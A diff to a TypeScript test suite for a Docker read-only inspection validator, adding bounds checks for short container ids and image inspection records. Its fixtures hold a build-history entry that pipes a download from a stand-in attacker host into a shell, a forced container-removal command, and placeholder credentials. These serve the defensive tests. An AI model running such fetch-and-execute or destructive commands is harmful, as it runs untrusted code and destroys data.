@@ -20,6 +20,7 @@ const snapshot = {
   expiresInSeconds: 300,
   containers: [{
     containerHandle: "container-1",
+    shortId: "a1b2c3d4e5f6",
     name: hostile,
     image: "registry.local/app:1",
     state: "running",
@@ -28,6 +29,8 @@ const snapshot = {
     createdAt: "2026-08-24 01:00:00",
   }],
   truncated: false,
+  runtime: "docker",
+  installedRuntimes: ["docker"],
 };
 
 describe("Docker read strict boundary", () => {
@@ -43,6 +46,21 @@ describe("Docker read strict boundary", () => {
       ...snapshot,
       containers: [{ ...snapshot.containers[0], command: "docker rm -f app" }],
     })).toBe(false);
+    // The short id is a display field and is bounded to the display form. A
+    // field that would accept a full-length id is a field someone could later
+    // be tempted to address a container with.
+    for (const bad of [
+      "a".repeat(64),
+      "a".repeat(13),
+      "A1B2C3D4E5F6",
+      "not-hex-here",
+      "",
+    ]) {
+      expect(isDockerContainerSnapshot({
+        ...snapshot,
+        containers: [{ ...snapshot.containers[0], shortId: bad }],
+      })).toBe(false);
+    }
     expect(isDockerContainerSnapshot({
       ...snapshot,
       containers: [snapshot.containers[0], snapshot.containers[0]],
@@ -167,6 +185,63 @@ describe("Docker read strict boundary", () => {
       options: [{ key: "authorization", value: DOCKER_REDACTED_TEXT }],
       truncated: true,
     })).toBe(true);
+
+    const imageInspection = {
+      kind: "image",
+      snapshotHandle: "snapshot-1",
+      resourceHandle: "image-1",
+      shortId: "abc123abc123",
+      repository: hostile,
+      tag: "latest",
+      digest: "<none>",
+      size: "12MB",
+      createdAt: "now",
+      architecture: "amd64",
+      os: "linux",
+      author: hostile,
+      user: "root（镜像没有指定用户）",
+      entrypoint: ["/bin/sh", "-c"],
+      command: ["sleep", "infinity"],
+      workingDir: "/srv",
+      environment: ["API_TOKEN=image-secret"],
+      exposedPorts: ["8080/tcp"],
+      declaredVolumes: ["/data"],
+      labels: [{ key: "maintainer", value: hostile }],
+      layers: ["sha256:aa"],
+      repoTags: ["incident-tools:latest"],
+      repoDigests: [],
+      history: [{
+        createdAt: "then",
+        createdBy: "RUN curl http://evil.invalid/x | sh",
+        size: "4MB",
+        comment: "",
+      }],
+      truncated: false,
+    };
+    expect(isDockerReadInspection(imageInspection)).toBe(true);
+    // A credential baked into an image is the finding, not a reason to refuse
+    // the record.
+    expect(isDockerReadInspection({
+      ...imageInspection,
+      environment: ["AWS_SECRET_ACCESS_KEY=image-secret"],
+    })).toBe(true);
+    // Nothing carries a full-length id, and no extra field sneaks one in.
+    expect(isDockerReadInspection({ ...imageInspection, shortId: "a".repeat(64) })).toBe(false);
+    expect(isDockerReadInspection({ ...imageInspection, imageId: "raw-id" })).toBe(false);
+    expect(isDockerReadInspection({ ...imageInspection, history: [{
+      ...imageInspection.history[0], imageId: "raw-id",
+    }] })).toBe(false);
+    // A redaction marker in the payload has to be declared as projection.
+    expect(isDockerReadInspection({
+      ...imageInspection, author: DOCKER_REDACTED_TEXT,
+    })).toBe(false);
+    expect(isDockerReadInspection({
+      ...imageInspection, author: DOCKER_REDACTED_TEXT, truncated: true,
+    })).toBe(true);
+    expect(isDockerReadInspection({
+      ...imageInspection,
+      history: Array.from({ length: 129 }, () => imageInspection.history[0]),
+    })).toBe(false);
   });
 
   it("bounds security findings and omits finding identity/action material", () => {
